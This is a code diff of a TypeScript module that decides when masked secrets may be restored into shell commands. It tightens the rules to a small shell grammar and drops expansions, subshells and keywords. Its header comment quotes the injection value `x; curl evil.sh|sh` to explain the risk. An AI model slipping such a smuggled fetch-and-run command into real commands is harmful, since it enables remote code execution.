@@ -10,20 +10,23 @@ import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'null
  * can change what the command does. A "secret" that reads
  * `x; curl evil.sh|sh` turns `echo {{PII_SECRET_0_…}}` into a second
  * command once restored. So in the `command` of a shell tool, a value
- * comes back only into a command whose every program is on a closed list
- * of programs that read their arguments as data (`ARG_DATA_PROGRAMS`),
- * and only as one plain word: letters, digits and `@%+:,./_=-`, not
- * starting with `-`, `=` or `~`. Any other program keeps every
- * placeholder, since no list can name every program that sends data out
- * or runs code. Otherwise the placeholder stays literal, and the command
- * works on the placeholder text, which is harmless.
+ * comes back only into a command written in a small grammar read whole
+ * (`advance`): words, single quotes, double quotes without `$`, a backtick
+ * or a backslash, `&&`, `||`, `|`, `;`, line breaks, redirections and
+ * heredocs. Anything else (any `$`, backticks, backslashes, parentheses,
+ * braces, comments, a lone `&`, `;;`, `[[`, `<<<`, a reserved word such as
+ * `if` or `case`) keeps every placeholder: shells disagree on how such
+ * constructs nest and end. Within that grammar, every program must be on a
+ * closed list of programs that read their arguments as data
+ * (`ARG_DATA_PROGRAMS`), and a value comes back only as one plain word:
+ * letters, digits and `@%+:,./_=-`, not starting with `-`, `=` or `~`.
+ * Otherwise the placeholder stays literal, and the command works on the
+ * placeholder text, which is harmless.
  *
  * On top of that:
  * - a listed program counts only by name, with no wrapper, no path, no
- *   redirection before it and no computed argument (`$x`, `$'…'`; `git
- *   commit` aside, whose options name no program or output file), and with
- *   none of the options that run or write (`COMMAND_OPTIONS`, abbreviations
- *   included);
+ *   redirection before it, and with none of the options that run or write
+ *   (`COMMAND_OPTIONS`, abbreviations included);
  * - a placeholder that is, or is part of, the program a simple command
  *   runs, a redirection target, an assignment, an argument of `export` or
  *   `alias`, or a `cd` argument stays masked: a value must not choose what
@@ -38,32 +41,27 @@ import { PLACEHOLDER_REGEX, type RestoreCapable, type RestoreResult } from 'null
  * - judged again with the values put back, the command must also split
  *   into the same simple commands and heredoc bodies as before, or it
  *   keeps every placeholder;
- * - the one exception to the plain-word rule is the body of a top-level
- *   heredoc that `cat` writes to standard output or to a document file
- *   (`.md`, `.txt`, …; `PLAIN_DATA_FILE`), or that `git commit -F -` reads
- *   as its message, in a command that runs nothing else that could read it
- *   as code (`cat > notes.md <<'EOF'`, `git commit -F - <<'EOF'`): that
- *   body is data, as a file the `Write` tool writes is, so only a line
- *   break is refused (and in a bare-delimiter body, which expands, `$`, a
- *   backtick or a backslash). The network checks skip such a body, so a
- *   commit message that mentions `ssh` does not count as a network call;
- * - no value comes back right after `$` or `${` where `$` expands.
+ * - the one exception to the plain-word rule is the body of a heredoc that
+ *   `cat` writes to standard output or to a document file (`.md`, `.txt`,
+ *   …; `PLAIN_DATA_FILE`), or that `git commit -F -` reads as its message,
+ *   in a command that runs nothing else that could read it as code
+ *   (`cat > notes.md <<'EOF'`, `git commit -F - <<'EOF'`): that body is
+ *   data, as a file the `Write` tool writes is, so only a line break is
+ *   refused (and in a bare-delimiter body, `$`, a backtick or a
+ *   backslash). The network checks skip such a body, so a commit message
+ *   that mentions `ssh` does not count as a network call.
  *
  * The command is read once, in time linear in its length, whatever the
- * number of placeholders; a command longer than `MAX_COMMAND_CHARS`,
- * nested `MAX_NESTING` levels deep or more, with a simple command past the
- * read window (`MAX_WORD_SCAN` characters or `MAX_WORDS` words, heredoc
- * bodies not counted), with a heredoc body whose closing line cannot be
- * found, with a heredoc or a `case` inside a command substitution (which
- * shells read differently), or whose words would be read past the scan
- * budget keeps every placeholder, and
- * one whose quoting or substitutions are left open loses the heredoc
- * exception. Heredoc bodies and `#`
- * comments are skipped by the quote lexer; `<<` counts only in shell code,
- * never inside quotes or as the here-string `<<<`. A `command` given as an
- * argv array (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`.
- * The Claude Code mod gets the same rules through the sidecar's `restore`
- * with `tool`.
+ * number of placeholders; a command longer than `MAX_COMMAND_CHARS`, with
+ * a simple command past the read window (`MAX_WORD_SCAN` characters or
+ * `MAX_WORDS` words, heredoc bodies not counted), with a heredoc body
+ * whose closing line cannot be found, or whose words would be read past
+ * the scan budget keeps every placeholder, and one whose quoting is left
+ * open loses the heredoc exception. `<<` counts only in shell code, never
+ * inside quotes. A `command` given as an argv array
+ * (`["bash", "-lc", "…"]`) is judged by `restoreShellArgv`. The Claude
+ * Code mod gets the same rules through the sidecar's `restore` with
+ * `tool`.
  *
  * Best effort for what leaves the machine: no list names every network
  * client, and a value restored into a file (`Write`, `Edit`) can be sent
@@ -97,13 +95,6 @@ const DATA_BODY_CONTEXTS: ReadonlySet<QuoteContext> = new Set<DataBodyContext>([
  * not starting with `-` (an option), `=` (zsh's `=cmd` expansion) or `~`
  * (a home directory). */
 const PLAIN_WORD = /^(?![-=~])[\p{L}\p{N}@%+:,./_=-]+$/u;
-
-/** Contexts where `$` expands. */
-const EXPANDING_CONTEXTS: ReadonlySet<QuoteContext> = new Set<QuoteContext>([
-  'none',
-  'double',
-  'heredoc-expanding',
-]);
 
 /** What a value may hold in a data heredoc body. */
 const DATA_BODY_SAFE: Readonly<Record<DataBodyContext, RegExp>> = {
@@ -770,8 +761,40 @@ const MESSAGE_FILE_FLAGS: ReadonlySet<string> = new Set(['-F', '--file']);
 
 /** Characters after which a new simple command starts (see
  * `separatesCommands`). */
-const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n', '(', ')', '{']);
-const REDIRECTION_SIDES: ReadonlySet<string> = new Set(['<', '>']);
+const COMMAND_SEPARATORS: ReadonlySet<string> = new Set([';', '&', '|', '\n']);
+/** Outside single quotes: expansions, substitutions and escapes, which the
+ * grammar read leaves out. */
+const UNREAD_OUTSIDE_SINGLE: ReadonlySet<string> = new Set(['$', '`', '\\']);
+/** In shell code: subshells, groups and brace expansions. */
+const UNREAD_IN_CODE: ReadonlySet<string> = new Set(['(', ')', '{', '}']);
+/** Shell reserved words: a simple command that starts with one is a
+ * compound command or a keyword the grammar read leaves out. */
+const RESERVED_WORDS: ReadonlySet<string> = new Set([
+  'if',
+  'then',
+  'else',
+  'elif',
+  'fi',
+  'case',
+  'esac',
+  'for',
+  'select',
+  'while',
+  'until',
+  'do',
+  'done',
+  'in',
+  'function',
+  'time',
+  'coproc',
+  '!',
+  '[[',
+  ']]',
+  '{',
+  '}',
+]);
+/** What makes a bare-delimiter heredoc body expand. */
+const BODY_EXPANSION = /[$`\\]/;
 
 /** Characters after which `#` starts a comment: it must begin a word.
  * Not `$` (`$#`) or `{` (`${#x}`). A backtick counts, so a doubtful `#`
@@ -792,27 +815,18 @@ const COMMENT_PRECEDERS: ReadonlySet<string> = new Set([
 
 const ENV_ASSIGNMENT = /^[A-Za-z_]\w*=/;
 const LEADING_TABS = /^\t+/;
-const WHITESPACE = /\s/;
-const CASE_KEYWORD = 'case';
 /** A redirection word (`>`, `2>>log`, `&>`, `<in`); group 1 is empty
  * when the operator stands alone and its target is the next word. */
 const REDIRECTION = /^(?:\d+|\{[A-Za-z_]\w*\})?(?:&>>?[|!]?|>>?[|!]|>&|<&|<<<|<<-?|<>|>>?|<)(\S*)$/;
 /** A version or `.exe` suffix on a program name (`python3.12`, `pwsh.exe`). */
 const PROGRAM_SUFFIX = /(?:[\d.]+|\.exe)$/;
 
-type FrameKind = 'code' | 'subst' | 'backtick' | 'single' | 'ansi' | 'double' | 'body' | 'param';
+type FrameKind = 'code' | 'single' | 'double';
 
-/** Shell code, where quotes, substitutions and operators mean something. */
-const CODE_KINDS: ReadonlySet<FrameKind> = new Set(['code', 'subst', 'backtick']);
-
-/** One level of shell nesting. `ansi` is `$'…'`, where backslash escapes
- * apply. `body` is an unquoted heredoc body: it expands `$` and backticks
- * like double quotes, but `"` is literal. In a code frame, `cmdStart` is
- * where the current simple command began, and `depth` counts the `(`
- * opened inside a `$(…)`. */
+/** One level of quoting. In the code frame, `cmdStart` is where the
+ * current simple command began. */
 interface Frame {
   readonly kind: FrameKind;
-  depth: number;
   cmdStart: number;
 }
 
@@ -850,12 +864,10 @@ interface Scan {
   heredocCommand: { start: number; data: boolean };
   /** `HEREDOC_OPERATOR`, sticky, for this scan alone. */
   readonly heredocOperator: RegExp;
-  /** The levels of nesting around the text being lexed: a bare heredoc
-   * body is lexed on its own, inside the levels its heredoc stands in. */
-  nesting: number;
-  /** The command cannot be read whole: a nested part (a heredoc body's own
-   * heredoc) could not be read, the nesting reached `MAX_NESTING`, a
-   * heredoc stands inside a command substitution, or a `case` does. */
+  /** `PLACEHOLDER_REGEX`, sticky, for this scan alone. */
+  readonly placeholderAt: RegExp;
+  /** The command cannot be read whole: it leaves the grammar read
+   * (`advance`), or a heredoc's closing line cannot be found. */
   broken: boolean;
 }
 
@@ -972,10 +984,10 @@ function judge(command: string, targets: readonly number[]): Verdict {
     line: { end: -1, lastPipe: -1 },
     heredocCommand: { start: -1, data: false },
     heredocOperator: new RegExp(HEREDOC_OPERATOR.source, 'y'),
-    nesting: 0,
+    placeholderAt: new RegExp(PLACEHOLDER_REGEX.source, 'y'),
     broken: false,
   };
-  const closed = lex(command, 0, command.length, codeFrame(), scan, command.length) && !scan.broken;
+  const closed = lex(command, scan) && !scan.broken;
   if (scan.broken) {
     return KEEP_ALL;
   }
@@ -1076,6 +1088,9 @@ function readCommands(
       skips.length === 0 ? NO_RANGES : skips.map(([s, e]) => [s - start, e - start] as const);
     const words = wordsOf(command.slice(start, end), relative);
     if (words.length >= MAX_WORDS) return undefined;
+    // Compound commands and keywords (`if`, `for`, `case`, `!`, …) are
+    // outside the grammar read.
+    if (RESERVED_WORDS.has(words[0]?.text ?? '')) return undefined;
     wordsAt.set(start, words);
     const p = programOf(words);
     if (p !== undefined) programs.push(p);
@@ -1263,10 +1278,9 @@ function runsFile(p: Program): boolean {
 function takesDataArgs(p: Program): boolean {
   if (p.name === undefined || p.wrappers.length > 0 || p.byPath) return false;
   if (p.redirectedPrefix) return false;
-  // A computed argument can expand to an option (`$'--pre'`); only
-  // `git commit`'s may be one (`-m "$msg"`): its options name no program
-  // or output file.
-  if (p.computedArgs && !(p.name === 'git' && p.args[0] === 'commit')) return false;
+  // A computed argument can expand to an option (`$'--pre'`). The grammar
+  // read leaves `$` and backticks out, so this is a second line.
+  if (p.computedArgs) return false;
   if (p.name === 'git') return ARG_DATA_GIT_SUBCOMMANDS.has(p.args[0] ?? '');
   return ARG_DATA_PROGRAMS.has(p.name);
 }
@@ -1448,29 +1462,24 @@ function normalise(word: string): string {
 }
 
 function codeFrame(): Frame {
-  return { kind: 'code', depth: 0, cmdStart: 0 };
+  return { kind: 'code', cmdStart: 0 };
 }
 
-/** Lex `command` from `start` to `end`, with `base` as the nesting in
- * force at `start`: record the context at each target in range, and the
- * extent of each simple command of shell code. */
-function lex(
-  command: string,
-  start: number,
-  end: number,
-  base: Frame,
-  scan: Scan,
-  limit: number,
-): boolean {
+/** Lex `command`: record the context at each target, and the extent of
+ * each simple command. Only a minimal grammar is read (`advance`); any
+ * other construct sets `scan.broken`, and the command keeps every
+ * placeholder. */
+function lex(command: string, scan: Scan): boolean {
+  const base = codeFrame();
   const stack: Frame[] = [base];
   const pending: Heredoc[] = [];
-  let i = start;
-  while (i < end) {
+  let i = 0;
+  while (i < command.length) {
     record(scan, i, contextOf(stack));
     const frame = stack.at(-1) ?? base;
-    if (command[i] === '\n' && pending.length > 0 && CODE_KINDS.has(frame.kind)) {
+    if (command[i] === '\n' && pending.length > 0 && frame.kind === 'code') {
       scan.commands.push([frame.cmdStart, i]);
-      const next = readHeredocBodies(command, i + 1, pending, scan, limit, stack.length);
+      const next = readHeredocBodies(command, i + 1, pending, scan);
       // An unreadable delimiter or no closing line: the body's extent, and
       // so every command after it, is unknown, so the command is not read
       // at all.
@@ -1484,14 +1493,11 @@ function lex(
       continue;
     }
     i += advance(stack, frame, pending, command, i, scan);
-    if (scan.nesting + stack.length > MAX_NESTING) scan.broken = true;
     // A command found unreadable needs no further reading.
     if (scan.broken) return false;
   }
-  record(scan, end - 1, contextOf(stack));
-  for (const frame of stack) {
-    if (CODE_KINDS.has(frame.kind)) scan.commands.push([frame.cmdStart, end]);
-  }
+  record(scan, command.length - 1, contextOf(stack));
+  scan.commands.push([base.cmdStart, command.length]);
   return stack.length === 1 && pending.length === 0;
 }
 
@@ -1506,13 +1512,16 @@ function record(scan: Scan, limit: number, context: QuoteContext): void {
 
 function contextOf(stack: readonly Frame[]): QuoteContext {
   const kind = stack.at(-1)?.kind;
-  if (kind === 'single' || kind === 'ansi') return 'single';
+  if (kind === 'single') return 'single';
   if (kind === 'double') return 'double';
-  if (kind === 'body') return 'heredoc-expanding';
   return 'none';
 }
 
-/** Read the token at `i`, update the nesting, return its length. */
+/** Read the token at `i`, update the quoting, return its length. Outside
+ * single quotes an expansion, a substitution or an escape (`$`, a
+ * backtick, a backslash) is not read: shells disagree on too much of what
+ * they can hold (nested heredocs, comments, `case`, `${x:-…}` spanning
+ * lines), so the command keeps every placeholder instead. */
 function advance(
   stack: Frame[],
   frame: Frame,
@@ -1521,64 +1530,25 @@ function advance(
   i: number,
   scan: Scan,
 ): number {
-  const ch = command[i];
+  const ch = command[i] ?? '';
   if (frame.kind === 'single') {
     if (ch === "'") stack.pop();
     return 1;
   }
-  if (frame.kind === 'ansi') {
-    if (ch === '\\') return 2;
-    if (ch === "'") stack.pop();
-    return 1;
-  }
-  if (ch === '\\') return 2;
-  if (ch === '$' && command[i + 1] === '(') {
-    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
-    return 2;
-  }
-  // `${…}`: a parameter expansion, whose word may hold quotes and
-  // substitutions. A line break or a heredoc inside one is read
-  // differently by shells (a `}` in a body ends the expansion), so such a
-  // command is not read.
-  if (ch === '$' && command[i + 1] === '{') {
-    stack.push({ kind: 'param', depth: 0, cmdStart: 0 });
-    return 2;
-  }
-  if (frame.kind === 'param') return advanceParam(stack, frame, command, i, scan);
-  if (ch === '`') {
-    if (frame.kind === 'backtick') closeCommand(stack, frame, i, scan);
-    else stack.push({ kind: 'backtick', depth: 0, cmdStart: i + 1 });
+  if (UNREAD_OUTSIDE_SINGLE.has(ch)) {
+    scan.broken = true;
     return 1;
   }
   if (frame.kind === 'double') {
     if (ch === '"') stack.pop();
     return 1;
   }
-  if (frame.kind === 'body') return 1;
   return advanceCode(stack, frame, pending, command, i, scan);
 }
 
-/** One character inside `${…}`: braces nest, quotes open as in code, and
- * a line break or a heredoc operator makes the command unreadable. */
-function advanceParam(
-  stack: Frame[],
-  frame: Frame,
-  command: string,
-  i: number,
-  scan: Scan,
-): number {
-  const ch = command[i];
-  if (ch === '\n' || (ch === '<' && command[i + 1] === '<')) scan.broken = true;
-  else if (ch === '{') frame.depth += 1;
-  else if (ch === '}') {
-    if (frame.depth === 0) stack.pop();
-    else frame.depth -= 1;
-  } else if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
-  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
-  return 1;
-}
-
-/** One token of shell code: the top level, or inside a substitution. */
+/** One character of shell code. Grouping and subshells (`( )`, `{ }`),
+ * comments, `[[`, `case` branches (`;;`), a lone `&` (background, `|&`,
+ * `<&`) and here-strings (`<<<`) are outside the grammar read. */
 function advanceCode(
   stack: Frame[],
   frame: Frame,
@@ -1587,28 +1557,22 @@ function advanceCode(
   i: number,
   scan: Scan,
 ): number {
-  const ch = command[i];
-  if (ch === '#' && startsWord(command, i)) return commentLength(command, i);
+  const ch = command[i] ?? '';
+  // A placeholder is one word, braces included.
+  if (ch === '{') {
+    scan.placeholderAt.lastIndex = i;
+    if (scan.placeholderAt.test(command)) return scan.placeholderAt.lastIndex - i;
+  }
+  if (UNREAD_IN_CODE.has(ch) || outsideGrammar(command, i)) {
+    scan.broken = true;
+    return 1;
+  }
   if (ch === '<' && command[i + 1] === '<') {
     return readHeredocOperator(command, i, frame, pending, scan);
   }
-  // Process substitution (`<(…)`, `>(…)`) is read like `$(…)`, also by
-  // bash 3.2's scan: a heredoc or a `case` inside one keeps every value.
-  if ((ch === '<' || ch === '>') && command[i + 1] === '(') {
-    if (ch === '>') scan.outputs.push('');
-    stack.push({ kind: 'subst', depth: 0, cmdStart: i + 2 });
-    return 2;
-  }
   if (ch === '>') return readOutputRedirection(command, i, scan);
-  // A `case` pattern's `)` ends `$(…)` in bash 3.2 and not in newer shells.
-  if (frame.kind === 'subst' && startsCase(command, i)) scan.broken = true;
-  if (ch === '$' && command[i + 1] === "'") {
-    stack.push({ kind: 'ansi', depth: 0, cmdStart: 0 });
-    return 2;
-  }
-  if (ch === "'") stack.push({ kind: 'single', depth: 0, cmdStart: 0 });
-  else if (ch === '"') stack.push({ kind: 'double', depth: 0, cmdStart: 0 });
-  else if (frame.kind === 'subst') trackParens(stack, frame, ch, i, scan);
+  if (ch === "'") stack.push({ kind: 'single', cmdStart: 0 });
+  else if (ch === '"') stack.push({ kind: 'double', cmdStart: 0 });
   if (separatesCommands(command, i)) {
     scan.commands.push([frame.cmdStart, i]);
     frame.cmdStart = i + 1;
@@ -1616,34 +1580,33 @@ function advanceCode(
   return 1;
 }
 
-/** True when the character at `i` of shell code ends a simple command.
- * `{` only as the grouping word (`{ cmd; }`), not in `${x}` or `-I{}`;
- * `&` only as an operator, not in a redirection (`<&3`, `&>log`); `\<&`
- * is a literal `<` and then `&`. */
+/** True when the operator at `i` is one the grammar does not read. */
+function outsideGrammar(command: string, i: number): boolean {
+  const ch = command[i];
+  const next = command[i + 1];
+  if (ch === '#') return startsWord(command, i);
+  if (ch === ';') return next === ';';
+  if (ch === '[') return next === '[' && startsWord(command, i);
+  if (ch === '<') return next === '<' && command[i + 2] === '<';
+  // `&&` and `&>` are read; any other `&` is not.
+  if (ch === '&') return next !== '&' && command[i - 1] !== '&' && next !== '>';
+  return false;
+}
+
+/** True when the character at `i` of shell code ends a simple command:
+ * `;`, a line break, `|` (not the `>|` redirection) or either `&` of
+ * `&&`. */
 function separatesCommands(command: string, i: number): boolean {
   const ch = command[i];
   if (ch === undefined || !COMMAND_SEPARATORS.has(ch)) return false;
-  if (ch === '{') return startsWord(command, i) && WHITESPACE.test(command[i + 1] ?? '');
-  // `>|` is a redirection that overrides noclobber, not a pipe; `\>|` is a
-  // literal `>` and then a pipe.
   if (ch === '|') return !isClobberBar(command, i);
   if (ch !== '&') return true;
-  const redirects = REDIRECTION_SIDES.has(command[i - 1] ?? '') && !escapedAt(command, i - 1);
-  return !redirects && command[i + 1] !== '>';
+  return command[i + 1] === '&' || command[i - 1] === '&';
 }
 
-/** True when the `|` at `i` belongs to the redirection `>|`: an
- * unescaped `>` just before it. */
+/** True when the `|` at `i` belongs to the redirection `>|`. */
 function isClobberBar(command: string, i: number): boolean {
-  return command[i - 1] === '>' && !escapedAt(command, i - 1);
-}
-
-/** True when the character at `k` is escaped: an odd number of
- * backslashes stands just before it. */
-function escapedAt(command: string, k: number): boolean {
-  let backslashes = 0;
-  for (let j = k - 1; j >= 0 && command[j] === '\\'; j--) backslashes += 1;
-  return backslashes % 2 === 1;
+  return command[i - 1] === '>';
 }
 
 /** Record the file the output redirection whose `>` is at `i` writes
@@ -1689,45 +1652,10 @@ function redirectionTarget(command: string, j: number): string {
   return quote === undefined && target.length <= MAX_WORD_CHARS ? target : '';
 }
 
-/** True when the word `case` starts at `i` of shell code. */
-function startsCase(command: string, i: number): boolean {
-  return (
-    command.startsWith(CASE_KEYWORD, i) &&
-    startsWord(command, i) &&
-    WHITESPACE.test(command[i + CASE_KEYWORD.length] ?? '')
-  );
-}
-
 /** True when the character at `i` begins a word of shell code. */
 function startsWord(command: string, i: number): boolean {
   const before = command[i - 1];
   return before === undefined || COMMENT_PRECEDERS.has(before);
-}
-
-/** A comment runs to the end of its line; the newline is left to the
- * caller, since heredoc bodies may start after it. */
-function commentLength(command: string, i: number): number {
-  const newline = command.indexOf('\n', i);
-  return (newline === -1 ? command.length : newline) - i;
-}
-
-function trackParens(
-  stack: Frame[],
-  frame: Frame,
-  ch: string | undefined,
-  i: number,
-  scan: Scan,
-): void {
-  if (ch === '(') frame.depth += 1;
-  if (ch !== ')') return;
-  if (frame.depth === 0) closeCommand(stack, frame, i, scan);
-  else frame.depth -= 1;
-}
-
-/** Close a substitution at `i`, recording its last simple command. */
-function closeCommand(stack: Frame[], frame: Frame, i: number, scan: Scan): void {
-  scan.commands.push([frame.cmdStart, i]);
-  stack.pop();
 }
 
 /** Record the heredoc whose operator starts at `i`; return its length.
@@ -1739,13 +1667,6 @@ function readHeredocOperator(
   pending: Heredoc[],
   scan: Scan,
 ): number {
-  if (command[i + 2] === '<') return 3;
-  // Shells disagree on where a heredoc inside a command substitution ends
-  // (bash 3.2 scans the body for quotes, parentheses and some comments to
-  // find the end of `$(…)`; bash 5.2 ends a body at a line that starts with
-  // the delimiter and holds a `)`; a backtick in the body ends a backtick
-  // substitution), so a command holding one is not read.
-  if (frame.kind === 'subst' || frame.kind === 'backtick') scan.broken = true;
   scan.heredocOperator.lastIndex = i;
   const m = scan.heredocOperator.exec(command);
   if (m === null) {
@@ -1808,38 +1729,29 @@ function readHeredocBodies(
   start: number,
   pending: readonly Heredoc[],
   scan: Scan,
-  limit: number,
-  depth: number,
 ): number | undefined {
   let bodyStart = start;
   for (const heredoc of pending) {
-    const end = findClosingLine(command, bodyStart, heredoc, limit);
+    const end = findClosingLine(command, bodyStart, heredoc, command.length);
     if (end === undefined) return undefined;
-    // The body's own nesting counts on top of the levels around it.
-    scan.nesting += depth;
     readBody(command, bodyStart, end.bodyEnd, heredoc, scan);
-    scan.nesting -= depth;
     bodyStart = end.next;
   }
   return bodyStart;
 }
 
-/** Record the targets in one body. A bare-delimiter body is lexed too,
- * since its substitutions run whatever reads the body. */
+/** Record the targets in one body. A bare-delimiter body that holds `$`,
+ * a backtick or a backslash expands, which the grammar read leaves out:
+ * the command is then not read. */
 function readBody(command: string, start: number, end: number, heredoc: Heredoc, scan: Scan): void {
-  // A body that expands keeps its substitutions in the text the network
-  // checks read; one with none is plain text.
-  const expands = !heredoc.literal && /[$`]/.test(command.slice(start, end));
-  scan.bodies.push([start, end]);
-  if (heredoc.data && !expands) scan.dataBodies.push([start, end]);
-  if (!heredoc.data) record(scan, end - 1, 'none');
-  else if (heredoc.literal) record(scan, end - 1, 'heredoc');
-  if (heredoc.literal) return;
-  // The body's own heredocs end inside it; one that does not, or a body
-  // whose nesting cannot be read, leaves the command unread.
-  if (!lex(command, start, end, { kind: 'body', depth: 0, cmdStart: 0 }, scan, end)) {
+  if (!heredoc.literal && BODY_EXPANSION.test(command.slice(start, end))) {
     scan.broken = true;
+    return;
   }
+  scan.bodies.push([start, end]);
+  if (heredoc.data) scan.dataBodies.push([start, end]);
+  const context = !heredoc.data ? 'none' : heredoc.literal ? 'heredoc' : 'heredoc-expanding';
+  record(scan, end - 1, context);
 }
 
 /** The body's end (start of the closing line) and where shell code
@@ -1902,11 +1814,7 @@ export function restoreShellCommand(
     sessionId,
     (value, at) => {
       if (keepAll || verdict.programAt.has(at)) return false;
-      const context = verdict.contextAt.get(at) ?? 'none';
-      // `$` or `${` just before it would make the value a parameter name
-      // (`${HOME}`) wherever `$` expands.
-      if (EXPANDING_CONTEXTS.has(context) && opensParameter(command, at)) return false;
-      return shellSafe(value, context);
+      return shellSafe(value, verdict.contextAt.get(at) ?? 'none');
     },
     shifts,
   );
@@ -1919,13 +1827,6 @@ export function restoreShellCommand(
   const same = sameLayout(verdict.layout, after.layout, shifts);
   if (same && !after.offMachine && !after.runsCode) return restored;
   return restoreEach(np, command, sessionId, () => false);
-}
-
-/** True when `$` or `${` stands just before `at`, so that a value there
- * would complete a parameter expansion. */
-function opensParameter(command: string, at: number): boolean {
-  const before = command[at - 1];
-  return before === '$' || (before === '{' && command[at - 2] === '$');
 }
 
 /** Where restoring one placeholder changed a command's length: at `at`
